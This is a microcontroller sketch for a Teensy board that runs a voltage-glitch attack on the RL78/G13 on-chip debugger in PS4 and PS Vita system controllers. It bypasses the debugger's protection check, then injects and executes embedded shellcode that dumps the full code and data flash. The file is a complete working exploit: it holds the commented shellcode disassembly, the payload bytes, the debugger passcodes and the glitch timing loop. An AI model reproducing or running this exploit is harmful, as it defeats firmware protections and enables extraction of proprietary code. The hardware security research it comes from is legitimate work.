/*****************************************************************************************
*  RL78/G13 On Chip Debugger Glitcher for dumping PS4/PSVITA syscon code/data flash
* 
* Developed by Wildcard
*
* Compatible with a Teensy 2.0++
*
* Credits to: 
* ~ Fail0verflow for the initial Writeup on the attack.
* ~ droogie for early syscon investigations.
* ~ juansbeck for his early findings on identifying the chip and pinout. 
* ~ Zecoxao, M4j0r, and SSL for their support in all syscon related work.
*****************************************************************************************/

//#define VITA_MODE // uncomment to use vita rl78 passcode
 
#define reset_pin       1  //d1
#define rx_pulldown     4  //d4
#define glitch_pin      5  //d5

#define OCD_VERSION_CMD 0x90
#define OCD_CONNECT_CMD 0x91
#define OCD_READ_CMD    0x92
#define OCD_WRITE_CMD   0x93
#define OCD_EXEC_CMD    0x94

#define BAUD_SET_CMD    0x9a

#define SOH             1
#define STX             2
#define ETX             3

#define ACK             6

/*
SFR2:000F07E0 loc_F07E0:     // shellcode for dumping full flash contents 0x0-0xfffff                       
SFR2:000F07E0                                       
SFR2:000F07E0                 mov     es, #0    // clear registers for memory addressing
SFR2:000F07E2                 movw    de, #0
SFR2:000F07E5                 nop
SFR2:000F07E6 loc_F07E6:                            
SFR2:000F07E6                 mov     a, es:[de]  // index memory 1 byte at a time and move to accumulator
SFR2:000F07E8                 call    sub_EFFA1   // call tool_tx to send byte in reg A over tool0 wire
SFR2:000F07EC                 incw    de      // increment de till full 0xffff wraps to 0
SFR2:000F07ED                 movw    ax, de
SFR2:000F07EE                 cmpw    ax, #0    
SFR2:000F07F1                 bnz     loc_F07E6   // if de hasnt wrapped keep dumping
SFR2:000F07F3                 br      loc_F07F9     // if it has, go to es inc routine
SFR2:000F07F5                 0x55          // overwrites ocd flag!
SFR2:000F07F7                 nop                   
SFR2:000F07F8                 nop
SFR2:000F07F9                 mov     a, es     
SFR2:000F07FB                 inc     a
SFR2:000F07FC                 and     a, #0Fh   // if es is addressing 0xfxxxx we are at last addressable region
SFR2:000F07FE                 mov     es, a     // set es with incremented range
BRAM:000F0800                 set1    byte_F0090.0  // enabled access to data flash, just setting everytime as its easier to fit in asm
BRAM:000F0804                 br      loc_F07E6   // branch to 0xffff dump routine
*/

uint8_t shellcode[] = {
	0xe0, 0x07, 0x26, // 0xF07E0 location, 0x26 length of packet
	0x41, 0x00, 0x34, 0x00, 0x00, 0x00, 0x11, 0x89, 0xFC, 0xA1, 0xFF, 0x0E, 0xA5, 0x15, 0x44,
	0x00, 0x00, 0xDF, 0xF3, 0xEF, 0x04, 0x55, 0x00, 0x00, 0x00, 0x8E, 0xFD, 0x81, 0x5C, 0x0F,
	0x9E, 0xFD, 0x71, 0x00, 0x90, 0x00, 0xEF, 0xE0
};

bool glitchworked = false;
int random_len;
int random_pos;

void setup(void) 
{
	Serial.begin(115200);   // USB uart
	Serial1.begin(115200);  // TOOL0 uart

	// Set up pins
	pinMode(reset_pin, OUTPUT);
	pinMode(rx_pulldown, OUTPUT);
	pinMode(glitch_pin, OUTPUT);
  
	// Set initial pin states
	digitalWrite(reset_pin, HIGH);
	digitalWrite(rx_pulldown, LOW);
	digitalWrite(glitch_pin, HIGH);
}

void loop(void) 
{

	// Keep trying to connect and glitch till we succeed
	while(!glitchworked)
	{
		digitalWrite(reset_pin, LOW);

		delayMicroseconds(80);

		Serial1.end();                 // needed to enter debugger mode

		delayMicroseconds(1800);

		digitalWrite(reset_pin, HIGH); // Start chip with TOOL0 low to enter OCD mode

		delay(2);

		Serial1.begin(115200);

		delay(1);

		Serial1.write(0xc5);          // Debugger init cmd

		delay(1);

		// Send Init Baud CMD frame 
		Serial1.write(SOH);   
		Serial1.write(0x03);          // Length
		Serial1.write(BAUD_SET_CMD);  
		Serial1.write((byte)0x00);    // 115200 baud rate
		Serial1.write(0x22);          // Voltage * 10 = 0x180 or 240(2.4v)
		Serial1.write(0x41);          // Checksum(length byte + data bytes = (~(sum) + 1)&0xff = chksum  
		Serial1.write(ETX);   

		// Pic a random slide early in order to not effect the delay time
		random_pos = random(6300);
    
		// Delay to after reply frame and slide glitch window randomly till it succeeds
		delayMicroseconds(1500);
		delayMicroseconds(random_pos);

		// Teensy 2.0 cant do ns delays but μs is thankfully still good enough to work with
		random_len = random(6.3);
    
		// Glitch the protection error after attempting to connect to debugger mode
		digitalWrite(glitch_pin, LOW);
		delayMicroseconds(random_len);
		digitalWrite(glitch_pin, HIGH);

		delay(15);

		Serial1.write(OCD_CONNECT_CMD); 

		delay(1);

		// Write passcode for debugger
		#ifdef VITA_MODE
    
		// All blank LOL
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0);
		Serial1.write(0xff); // Checksum
    
		#else

		//:Not:Used:
		Serial1.write(':');
		Serial1.write('N');
		Serial1.write('o');
		Serial1.write('t');
		Serial1.write(':');
		Serial1.write('U');
		Serial1.write('s');
		Serial1.write('e');
		Serial1.write('d');
		Serial1.write(':');
		Serial1.write(0x6f); // Checksum
      
		#endif

		delay(10);

		// Write the payload now that we have succeeded in glitching 
		Serial1.write(OCD_WRITE_CMD);

		delay(1);

		// Write shellcode to OCD rom entry for 94 cmd
		for(int s = 0; s < sizeof(shellcode); s++)
		{
			Serial1.write(shellcode[s]);
		}

		delay(5);

		// Trigger execution of the written payload at 0xF07E0
		Serial1.write(OCD_EXEC_CMD);


		Serial1.flush();
    
		while(Serial1.available() > 0) 
		{
			Serial1.read();
		}

		delay(10);
  
		if(Serial1.available())
		{
			Serial.println("detected!"); 
			glitchworked = true;
		}

	}

    // Remove RX pulldown to stabilize TX from syscon
    digitalWrite(rx_pulldown, HIGH);  
  
    while(1);

    // Keep alive for infloop on dumping flash, memory is a donut om nom nom
    while(1);
    delay(100);

}
